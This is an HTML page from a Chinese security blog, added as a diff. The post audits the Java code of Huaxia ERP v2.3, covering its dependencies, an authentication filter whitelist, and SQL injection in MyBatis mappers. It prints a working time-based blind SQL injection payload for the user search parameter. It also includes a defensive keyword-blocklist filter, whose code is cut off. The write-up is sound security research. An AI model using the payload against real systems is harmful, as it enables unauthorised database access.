@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Java 代码审计之华夏 ERP CMS v2.3 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java 代码审计之华夏 ERP CMS v2.3</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-09-30 21:32:01</span>
+        <span class="mobile">2022-09-30 21:32</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-10-14 19:24:37</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>4.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>17 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="Java-代码审计之华夏-ERP-CMS-v2-3"><a href="#Java-代码审计之华夏-ERP-CMS-v2-3" class="headerlink" title="Java 代码审计之华夏 ERP CMS v2.3"></a>Java 代码审计之华夏 ERP CMS v2.3</h1><p>项目地址: <a target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases/tag/2.3">Release 华夏ERP_v2.3</a></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><ul>
+<li>这个 CMS 被用于了蓝帽杯的比赛当中，是让我们进行修洞了，当时因为自己环境的一些问题没有把这道题目修好，感觉到非常遗憾。</li>
+</ul>
+<p>趁着自己最近学了一会儿的代码审计，想尝试自己审计一遍。</p>
+<h2 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h2><p>简单搭即可，导 sql，修改端口为 8081，方便测试。</p>
+<h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><h3 id="1-审计准备"><a href="#1-审计准备" class="headerlink" title="1. 审计准备"></a>1. 审计准备</h3><p>我个人的习惯是先看一看 pom.xml，再看一些 Filter</p>
+<h4 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h4><img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/fastjson1255.png" class="">
+
+<p>这里有个 fastjson 1.2.55 的洞，或许可以进行反序列化的攻击，不确定，cy 一下。</p>
+<p>还有一个 log4j2 的漏洞，我们后续会提到</p>
+<p>其他组件基本就没啥了，我们去看 Filter</p>
+<h4 id="Filter-审计"><a href="#Filter-审计" class="headerlink" title="Filter 审计"></a>Filter 审计</h4><img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/NotFilter.png" class="">
+
+<p>使用 <code>@WebInitParam</code> 注解配置多个 name，对 <code>.css#.js#.jpg#.png#.gif#.ico</code>，<code>/user/login#/user/registerUser#/v2/api-docs</code>资源请求的时候不会进行拦截。</p>
+<p>再来看具体的 Filter 做了什么工作，关于 Filter：<a href="https://drun1baby.github.io/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/">Java内存马系列-01-基础内容学习)</a></p>
+<ul>
+<li>我们需要去到 <code>doFilter()</code> 方法中去看</li>
+</ul>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/doFilter.png" class="">
+
+<p>这个 <code>doFilter()</code> 方法，先是做了一个很基础的拦截器，代码如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HttpServletRequest</span> servletRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>  
+<span class="token class-name">HttpServletResponse</span> servletResponse <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> response<span class="token punctuation">;</span>  
+<span class="token class-name">String</span> requestUrl <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token comment">//具体，比如：处理若用户未登录，则跳转到登录页  </span>
+<span class="token class-name">Object</span> userInfo <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里有几种情况是不阻止的：register.html，login.html，以及 doc.html；因为如果这几个网站被 ban，业务都跑不了了。</p>
+<p>继续往下看，其中定义了一个 <code>verify()</code> 方法，这是拿来自己添加不被拦截的网页的，可能是当时开发者想要测试功能性，所以就多了这么一个 <code>verify()</code> 方法。</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/ignoredList.png" class="">
+
+<p>这里也和上面的 <code>@WebInitParam</code> 注解对应起来了，当我们不处于登录的状态下，也可以直接访问 <code>.css，.js</code> 这些文件，测试如图。</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/ignoredSuccessTest.png" class="">
+
+<p>再往下看，是关于 <code>allowUrls</code>  的一个判断，简单来说 <code>allowUrls</code> 就是加白，这也和我们上面讲的 <code>@WebInitParam</code> 注解对上了，如图</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/allowUrls.png" class="">
+
+<ul>
+<li>现在我们把 <code>Filter</code> 全部都解读完了，做个小结，并且思考</li>
+</ul>
+<h4 id="关于审计完-Filter-后的思考"><a href="#关于审计完-Filter-后的思考" class="headerlink" title="关于审计完 Filter 后的思考"></a>关于审计完 Filter 后的思考</h4><p><strong>小总结</strong></p>
+<p>1、加了白，对应的资源加白在 <code>ignoredUrl</code> 中，以 <code>#</code> 分割，看似没什么问题；还有对应的 Path 加白，加了 <code>/user/login</code>，<code>/user/registerUser</code> 以及 <code>/v2/api-docs</code></p>
+<p>2、没有进行 XSS 的转义过滤和 SQL 注入的恶意字符过滤，一般来说，以 RuoYi 的项目为例：都会存在一个专门过滤的 Filter，但是这里面没有，或许会埋下部分伏笔。</p>
+<p><strong>思索</strong></p>
+<p>对于加白的思索：是否会存在潜在的未授权访问？对于资源加白 ———— <code>ignoredList</code> 的判断只是进行了正则的判断，这并不符合开发的安全性，正确的写法应该使用 <code>endsWith()</code> 来判断 URL 是否以 <code>.css</code>；<code>.js</code> 等资源后缀结尾</p>
+<p>对于 URL 加白的思考：使用 <code>startsWith()</code> 方法来判断 URL 是否是白名单开头的时候，可以使用目录穿越来骗过判断，导致可以绕过认证请求。这种方式比较神奇，后续会打断点调试看看。</p>
+<h4 id="审计准备小结"><a href="#审计准备小结" class="headerlink" title="审计准备小结"></a>审计准备小结</h4><p>先看 pom.xml，再看 Filter。</p>
+<p>这里总结出来，单看 Filter 就看出来几个隐藏的漏洞了：比如可能存在的 SQL 注入，比如可能存在的 XSS；还有一些越权的漏洞</p>
+<h3 id="2-SQL-注入"><a href="#2-SQL-注入" class="headerlink" title="2. SQL 注入"></a>2. SQL 注入</h3><ul>
+<li>关于 SQL 注入在 Java 当中的代码审计可以看我这篇文章：<a href="https://drun1baby.github.io/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Java OWASP 中的 SQL 注入代码审计</a></li>
+</ul>
+<p>根据 pom.xml 我们可以知道这是个 mybatis，所以对于 mybatis 的 SQL 注入，我们可以直接在 <code>mapper_xml</code> 文件夹内进行全局搜索 <code>$</code> 以及 <code>like</code>，<code>in</code> 以及 <code>order by</code>。</p>
+<p>当然，前提是有问题的 SQL 语句当中，输入是可控的。</p>
+<p>我们在 <code>mapper_xml</code> 文件夹下全局搜索 <code>like</code> 关键字</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/SQLike.png" class="">
+
+<p>出师及其顺利！（后面发现并不是）</p>
+<h4 id="失败的-SQL-注入"><a href="#失败的-SQL-注入" class="headerlink" title="失败的 SQL 注入"></a>失败的 SQL 注入</h4><p>我们先点进去看看，大致分析如图</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/AccoutMapperEx.png" class="">
+
+<p>实际开发当中，对应 <code>AccountMapperEx.xml</code> 的一般都是定义在 <code>AccountMapperEx</code> 接口中（如果封装的好的话</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/AccountMapperEx.png" class="">
+
+<p>对应的 controller 文件应该是 <code>AccoutController</code>。对应的 service 文件是 <code>AccoutService</code>，这里一步步逆推，根据反序列化的链子的思维似乎是要出点问题。</p>
+<p>问题在于，最后总是会指向一个 <code>ResourceController</code>，有师傅的文章说可以一直找，我个人认为这种是错误的。</p>
+<p>根据 MVC 架构思维，我们先看 Service 层，定位如图</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/selectByConditionAccount.png" class="">
+
+<p>但是到这个地方就断掉了，说明其实这里，name 并不是可控的，算是一个小失败。</p>
+<blockquote>
+<p>总结一下这次的 SQL 注入失败原因，输入并非可控。</p>
+</blockquote>
+<h4 id="成功的-SQL-注入"><a href="#成功的-SQL-注入" class="headerlink" title="成功的 SQL 注入"></a>成功的 SQL 注入</h4><p>这里我们就直接去找 <code>UserMapperEx.xml</code>，因为这个业务点我认为是非常非常直接的，显山露水的，找可控点更为容易。在 <code>UserMapperEx.xml</code> 里面搜索 <code>like</code> 这一关键字</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/UserMapper.png" class="">
+
+<p>对应的，我们去到接口：<code>UserMapperEx.java</code></p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/UserMapperEx.png" class="">
+
+<p>对应的 Service 接口与 Controller 接口如图</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/countsByUser.png" class="">
+
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/controller.png" class="">
+
+<p>那么试想一下运用到这个 SQL 语句的场景该是什么？很明显在 <code>/addUser</code> 这个情况下是可以触发的。</p>
+<p>我这里访问了 <code>/user/list</code> 页面，抓包后看到了 <code>search</code> 后跟着一堆参数，这堆参数进行 URL 解码后是 <code>userName</code> 与 <code>loginName</code> 的值。</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/nothing.png" class="">
+
+<p>看到这里我立马明白了，其实 <code>countsByUser()</code> 这个有问题的 SQL 语句并不是说只有后端处理 <code>/addUser</code> 接口的时候才会用到，而是只要我以 userName 和 loginName 作为参数进行搜索就会用到。</p>
+<p>我们的 payload 如下</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&quot;userName&quot;:&quot;&quot;,&quot;loginName&quot;:&quot;&#39; AND SLEEP(5)-- jsh&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>一个简单的盲注，成功！同时我们在控制台可以看到有如图的 SQL 语句</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/logs.png" class="">
+
+<p>在 Burpsuite 中亦测试成功</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/Sleep.png" class="">
+
+<ul>
+<li>相类似的 SQL 注入在这个项目里面还有很多很多，师傅们在学习的时候可以尝试自己挖掘并测试。</li>
+</ul>
+<h4 id="SQL-注入的修复"><a href="#SQL-注入的修复" class="headerlink" title="SQL 注入的修复"></a>SQL 注入的修复</h4><p>详见这篇文章 <a target="_blank" rel="noopener" href="http://localhost:4000/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">Java OWASP 中的 SQL 注入代码审计</a></p>
+<p>如果对于应急处理，比如很多 AWD Plus 的情况下，建议是写一个 FIiter 来防御，代码如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebFilter</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span><span class="token punctuation">;</span>
+
+
+<span class="token comment">/**
+ @ author: Drunkbaby
+ @ usages: 用于 SQL 注入的自定义防护
+ 需要加入相应的 Servlet 环境，因为我这里是纯代码，就不打环境了
+ @ 过滤 url：在 WebFilter 当中添加 urlPatterns
+ */</span>
+
+<span class="token annotation punctuation">@Component</span>
+<span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/system/role/list"</span><span class="token punctuation">,</span> filterName <span class="token operator">=</span> <span class="token string">"sqlInjectFilter"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> sqlFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> arg0<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> res<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> req<span class="token punctuation">;</span>
+        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> res<span class="token punctuation">;</span>
+        <span class="token comment">// 获得所有请求参数名</span>
+        <span class="token class-name">Enumeration</span> params <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">// 得到参数名</span>
+            <span class="token class-name">String</span> name <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 得到参数对应值</span>
+            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> value<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                sql <span class="token operator">=</span> sql <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sqlValidate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"您发送请求中的参数中含有非法字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">/**
+     * 参数校验
+     * @param str
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">sqlValidate</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//统一转为小写</span>
+        <span class="token class-name">String</span> badStr <span class="token operator">=</span> <span class="token string">"select|update|and|or|delete|insert|truncate|char|into|substr|ascii|declare|exec|count|master|into|drop|execute|table"</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> badStrs <span class="token operator">=</span> badStr<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> badStrs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">//循环检测，判断在请求参数当中是否包含SQL关键字</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>badStrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
